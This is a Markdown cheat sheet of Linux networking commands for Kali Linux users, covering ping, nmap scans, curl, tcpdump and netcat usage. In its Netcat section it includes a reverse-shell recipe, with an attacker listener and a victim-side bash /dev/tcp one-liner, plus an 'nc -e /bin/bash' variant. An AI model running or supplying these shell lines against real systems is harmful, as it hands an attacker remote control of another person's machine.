# **Networking Commands - Linux Quick Reference**
Recommended OS: Kali Linux

## Table of Contents
- [Network Utilities](#network-utilities)
- [Netcat Commands](#netcat-commands)
- [Network Troubleshooting](#network-troubleshooting)

---

## Network Utilities

- **`ping`**: Test connectivity to a host.  `ping <hostname or ip>`
- **`ifconfig`**: Display network info, like IP address.  `ifconfig`
- **`netstat`**: Show network connections and statistics.  `netstat -tuln`
- **`ss`**: Show socket statistics (replacement for netstat). `ss -tuln`
- **`whois`**: Retrieve WHOIS information for a domain. `whois example.com`
- **`nmap`**: Scan network for hosts and open ports, for one ip, or a range.
  ex. `nmap <ip>` or `nmap 192.168.1.1-20` or `nmap 192.168.1.0/24`
- **`curl`**: Transfer data to and from a server (HTTP, FTP).  `curl http://example.com/file.zip`
- **`route`**: View or modify the routing table.  `route -n`
- **`mtr`**: Diagnostic tool combining ping and traceroute. `mtr <hostname or ip>`
- **`arp`**: Show or modify the ARP (Address Resolution Protocol) table. `arp -a`
- **`wget`**: Download files from the web. `wget http://example.com/file.zip`


---

## Netcat Commands

- **Host listens on port**:  `nc -lvp 1234` (l-listning, v-verbose, p-port)
- **Client connects to host**:  `nc <hostname or ip> 1234`
- **Scan for certain ports in a range**: `nc -zv <hostname> 1-100` (z-scan without full connection)
- **Send file**:  
  1. Receiver (opens port & prepares to save file):  `nc -lvp 4321 > received_file.txt`  
  2. Sender (connects & sends file to receiver’s IP):  `nc <receiver_ip> 4321 < home/kali/my_file.txt` (must use absolute path)
- **Reverse Shell**:  
  1. Sender/Attacker (listens for connection)::  `nc -lvp 4444`  
  2. Receiver/Victim (connects & gives interactive shell to attacker):  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
  - Note: On some systems use `nc -l -p 1234 -e /bin/bash`
- **`ncat`**: Netcat's more secure version for encrypted SSL connections. `ncat --ssl -l 1234`

---

## Network Troubleshooting

- **`dig`**: Query DNS.  `dig example.com`
- **`tcpdump`**: Capture network traffic.  `sudo tcpdump -i eth0` or `sudo tcpdump src host <ip>`
- **`hostname`**: Show or set hostname.  `hostname`
- **`nfsstat`**: Display NFS (Network File System) statistics. `nfsstat -c`
- **`iwconfig`**: Configure wireless network interfaces. `iwconfig wlan0`

---

*Created by MD Harrell*  
For more info, visit the [Kali Linux Docs](https://www.kali.org/docs/).
